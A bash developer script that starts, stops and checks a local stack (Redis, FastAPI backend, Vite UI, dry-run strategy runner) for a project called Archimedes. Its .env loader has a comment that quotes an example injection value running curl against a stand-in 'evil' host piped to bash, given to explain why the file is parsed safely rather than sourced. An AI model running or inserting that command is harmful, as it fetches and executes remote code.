#!/usr/bin/env bash
# dev.sh — run the full Archimedes stack locally for fast feedback.
#
# Usage:
#   ./dev.sh              # start everything
#   ./dev.sh stop         # stop everything
#   ./dev.sh status       # show running processes
#   ./dev.sh logs [svc]   # tail logs (backend|ui|strategy-runner)
#   ./dev.sh test         # run backend tests + frontend build check
#
# What it starts:
#   1. Redis    (via docker, if not already running)
#   2. Backend  (FastAPI on :8000, with API proxy)
#   3. UI       (Vite dev server on :5173 with HMR)
#   4. Strategy runner (single tick + exit, for quick validation)
#
# Prerequisites:
#   - .env file exists (cp .env.example .env + fill in keys)
#   - backend/.venv exists (cd backend && python -m venv .venv && pip install -r requirements.txt)
#   - ui/node_modules exists (cd ui && npm install)
#   - Docker available (for Redis only)

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
BACKEND_DIR="$ROOT_DIR/backend"
UI_DIR="$ROOT_DIR/ui"
PID_DIR="$ROOT_DIR/.dev-pids"
LOG_DIR="$ROOT_DIR/.dev-logs"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()  { echo -e "${CYAN}[archimedes]${NC} $*"; }
ok()   { echo -e "${GREEN}[ok]${NC} $*"; }
warn() { echo -e "${YELLOW}[warn]${NC} $*"; }
die()  { echo -e "${RED}[error]${NC} $*"; exit 1; }

# ─── Setup ─────────────────────────────────────────────────────────

mkdir -p "$PID_DIR" "$LOG_DIR"

check_prereqs() {
    # Check .env
    if [ ! -f "$ROOT_DIR/.env" ]; then
        die "No .env file. Run: cp .env.example .env  (then fill in keys)"
    fi

    # Check backend venv
    if [ ! -d "$BACKEND_DIR/.venv" ]; then
        warn "backend/.venv not found. Creating..."
        cd "$BACKEND_DIR"
        python3 -m venv .venv
        .venv/bin/pip install -q -r requirements.txt
        ok "backend/.venv created"
    fi

    # Check UI deps
    if [ ! -d "$UI_DIR/node_modules" ]; then
        warn "ui/node_modules not found. Installing..."
        cd "$UI_DIR"
        npm install
        ok "ui/node_modules installed"
    fi

    # Check docker
    if ! command -v docker &>/dev/null; then
        die "Docker not found. Install Docker Desktop or Docker Engine."
    fi
}

# Load .env (non-destructive — only sets vars that aren't already set).
# Safe parse: never `source .env` (that executes it as a shell script, so a
# value like `X=$(curl http://evil/x | bash)` would run). We only export plain
# KEY=VALUE lines with shell-safe keys.
load_env() {
    [[ -f "$ROOT_DIR/.env" ]] || return 0
    while IFS='=' read -r key value; do
        # Skip comments and blank lines
        [[ "$key" =~ ^[[:space:]]*# ]] && continue
        [[ -z "$key" ]] && continue
        # Skip keys with shell-unsafe characters
        [[ "$key" =~ [^A-Za-z0-9_] ]] && continue
        # Strip one layer of surrounding single/double quotes
        value="${value%\"}"; value="${value#\"}"
        value="${value%\'}"; value="${value#\'}"
        # Non-destructive: only export if not already set
        if [[ -z "${!key+x}" ]]; then
            export "$key=$value"
        fi
    done < "$ROOT_DIR/.env"
}

# ─── Redis ─────────────────────────────────────────────────────────

start_redis() {
    if docker ps --format '{{.Names}}' 2>/dev/null | grep -q 'archimedes-redis'; then
        ok "Redis already running"
        return
    fi

    # Check if something is on 6379 already
    if lsof -i :6379 &>/dev/null; then
        ok "Something already listening on :6379 (using that)"
        return
    fi

    log "Starting Redis..."
    docker run -d --name archimedes-redis -p 6379:6379 redis:7-alpine >/dev/null 2>&1 || true
    sleep 1
    if docker ps --format '{{.Names}}' | grep -q 'archimedes-redis'; then
        ok "Redis started on :6379"
    else
        warn "Redis container may already exist (stopped). Starting..."
        docker start archimedes-redis >/dev/null 2>&1 || true
        sleep 1
        ok "Redis started"
    fi
}

stop_redis() {
    if docker ps --format '{{.Names}}' | grep -q 'archimedes-redis'; then
        docker stop archimedes-redis >/dev/null 2>&1
        ok "Redis stopped"
    fi
}

# ─── Backend ───────────────────────────────────────────────────────

start_backend() {
    if [ -f "$PID_DIR/backend.pid" ] && kill -0 "$(cat "$PID_DIR/backend.pid")" 2>/dev/null; then
        ok "Backend already running (PID $(cat "$PID_DIR/backend.pid"))"
        return
    fi

    log "Starting backend on :8000..."
    load_env
    cd "$BACKEND_DIR"
    REDIS_URL="${REDIS_URL:-redis://localhost:6379/0}" \
    .venv/bin/uvicorn archimedes.main:app \
        --host 0.0.0.0 \
        --port 8000 \
        --reload \
        > "$LOG_DIR/backend.log" 2>&1 &
    echo $! > "$PID_DIR/backend.pid"

    # Wait for it to come up
    for i in $(seq 1 15); do
        if curl -s http://localhost:8000/health >/dev/null 2>&1; then
            ok "Backend ready on :8000  (pid $(cat "$PID_DIR/backend.pid"))"
            return
        fi
        sleep 1
    done
    warn "Backend may still be starting. Check: ./dev.sh logs backend"
}

# ─── UI ────────────────────────────────────────────────────────────

start_ui() {
    if [ -f "$PID_DIR/ui.pid" ] && kill -0 "$(cat "$PID_DIR/ui.pid")" 2>/dev/null; then
        ok "UI already running (PID $(cat "$PID_DIR/ui.pid"))"
        return
    fi

    log "Starting UI on :5173..."
    cd "$UI_DIR"
    npm run dev -- --host 0.0.0.0 --port 5173 \
        > "$LOG_DIR/ui.log" 2>&1 &
    echo $! > "$PID_DIR/ui.pid"

    for i in $(seq 1 10); do
        if curl -s http://localhost:5173 >/dev/null 2>&1; then
            ok "UI ready on :5173  (pid $(cat "$PID_DIR/ui.pid"))"
            return
        fi
        sleep 1
    done
    warn "UI may still be starting. Check: ./dev.sh logs ui"
}

# ─── Strategy runner (single tick) ─────────────────────────────────

run_strategy_tick() {
    log "Running strategy evaluation (single tick)..."
    load_env
    cd "$BACKEND_DIR"

    REDIS_URL="${REDIS_URL:-redis://localhost:6379/0}" \
    AGENT_DRY_RUN=true \
    AGENT_INTERVAL_SECONDS=999999 \
    .venv/bin/python -c "
import asyncio, logging, sys
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(name)s %(message)s', stream=sys.stdout)

from archimedes.services.strategy_provider import default_provider
from archimedes.services.strategy_signal_evaluator import strategy_evaluator
from archimedes.chain.client import chain_client

async def main():
    provider = default_provider()
    strategies = provider.list_strategies()
    print(f'\nLoaded {len(strategies)} strategies:')

    synths = [sym for sym, addr in chain_client.settings.synth_addresses.items() if addr]
    results = await asyncio.to_thread(strategy_evaluator.evaluate_strategies, strategies, synths)

    for r in results:
        print(f'\n  {r.paper_title}:')
        for s in r.signals:
            print(f'    {s.asset}: {s.signal.value:7s} {s.weight:5.0%}  — {s.reason}')

    weights = strategy_evaluator.aggregate_signals(results, usdc_floor=0.20)
    print(f'\nTarget allocation:')
    for sym, w in sorted(weights.items(), key=lambda x: -x[1]):
        print(f'    {sym:6s} {w:5.1%}')

    connected = await chain_client.is_connected()
    print(f'\nChain connected: {connected}')
    print('✅ Strategy evaluation complete')

asyncio.run(main())
" 2>&1 | tee "$LOG_DIR/strategy-tick.log"
}

# ─── Signals API check ─────────────────────────────────────────────

check_signals_api() {
    log "Checking /api/strategies/signals..."
    local response
    response=$(curl -s http://localhost:8000/api/strategies/signals 2>&1) || {
        warn "Signals API not reachable. Is the backend running?"
        return 1
    }
    local count
    count=$(echo "$response" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('strategy_count',0))" 2>/dev/null) || {
        warn "Signals API returned non-JSON"
        return 1
    }
    ok "Signals API: $count strategies evaluated, regime=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin)['regime'])")"
}

# ─── Stop ──────────────────────────────────────────────────────────

stop_all() {
    log "Stopping all services..."
    for pidfile in "$PID_DIR"/*.pid; do
        [ -f "$pidfile" ] || continue
        local pid
        pid=$(cat "$pidfile")
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null
            ok "Killed PID $pid ($(basename "$pidfile" .pid))"
        fi
        rm -f "$pidfile"
    done
    stop_redis
    ok "All stopped"
}

# ─── Status ────────────────────────────────────────────────────────

show_status() {
    echo ""
    echo "Archimedes Dev Stack Status"
    echo "============================"

    # Redis
    if docker ps --format '{{.Names}}' 2>/dev/null | grep -q 'archimedes-redis'; then
        ok "Redis:    running on :6379"
    elif lsof -i :6379 &>/dev/null; then
        ok "Redis:    running on :6379 (external)"
    else
        warn "Redis:    NOT running"
    fi

    # Backend
    if curl -s http://localhost:8000/health >/dev/null 2>&1; then
        local health
        health=$(curl -s http://localhost:8000/health 2>/dev/null)
        ok "Backend:  running on :8000 ($health)"
    else
        warn "Backend:  NOT running"
    fi

    # UI
    if curl -s http://localhost:5173 >/dev/null 2>&1; then
        ok "UI:       running on :5173"
    else
        warn "UI:       NOT running"
    fi

    echo ""
}

# ─── Logs ──────────────────────────────────────────────────────────

show_logs() {
    local svc="${1:-}"
    case "$svc" in
        backend)   tail -f "$LOG_DIR/backend.log" ;;
        ui)        tail -f "$LOG_DIR/ui.log" ;;
        strategy*) cat "$LOG_DIR/strategy-tick.log" 2>/dev/null || warn "No strategy tick log yet. Run: ./dev.sh tick" ;;
        *)         tail -f "$LOG_DIR/backend.log" "$LOG_DIR/ui.log" 2>/dev/null ;;
    esac
}

# ─── Test ──────────────────────────────────────────────────────────

run_tests() {
    log "Running checks..."

    # Backend import check
    cd "$BACKEND_DIR"
    .venv/bin/python -c "
from archimedes.api.routes import vaults_router, strategies_router, regime_router
from archimedes.chain.agent_runner import StrategyRunner
from archimedes.services.strategy_signal_evaluator import strategy_evaluator
from archimedes.services.strategy_provider import default_provider
from archimedes.services.redis_state import AgentStateStore
print('  backend imports: OK')
" || die "Backend import check failed"

    # Frontend build check
    cd "$UI_DIR"
    local build_out
    build_out=$(npm run build 2>&1)
    echo "$build_out" | grep -qE 'built in' && echo "  frontend build:  OK" || die "Frontend build failed"

    # Docker compose validation
    cd "$ROOT_DIR"
    python3 -c "import yaml; yaml.safe_load(open('docker-compose.yml'))" && echo "  docker-compose:  OK" || die "docker-compose.yml invalid"

    ok "All checks passed"
}

# ─── Main ──────────────────────────────────────────────────────────

case "${1:-start}" in
    start)
        check_prereqs
        echo ""
        log "Starting Archimedes dev stack..."
        echo ""
        start_redis
        start_backend
        start_ui
        echo ""
        ok "Dev stack ready!"
        echo ""
        echo "  UI:       http://localhost:5173"
        echo "  Backend:  http://localhost:8000/docs"
        echo "  Signals:  http://localhost:8000/api/strategies/signals"
        echo "  Health:   http://localhost:8000/health"
        echo ""
        echo "  ./dev.sh stop      — stop everything"
        echo "  ./dev.sh status     — check what's running"
        echo "  ./dev.sh logs       — tail logs"
        echo "  ./dev.sh tick       — run strategy evaluation once"
        echo ""
        ;;
    stop)
        stop_all
        ;;
    restart)
        stop_all
        exec "$0" start
        ;;
    status)
        show_status
        ;;
    logs)
        show_logs "${2:-}"
        ;;
    tick)
        run_strategy_tick
        ;;
    signals)
        check_signals_api
        ;;
    test)
        run_tests
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status|logs [svc]|tick|signals|test}"
        echo ""
        echo "Commands:"
        echo "  start    Start Redis + Backend + UI"
        echo "  stop     Stop all services"
        echo "  restart  Stop and restart"
        echo "  status   Show what's running"
        echo "  logs     Tail logs (optional: backend|ui)"
        echo "  tick     Run strategy evaluation once (dry-run)"
        echo "  signals  Check /api/strategies/signals endpoint"
        echo "  test     Run import + build checks"
        exit 1
        ;;
esac
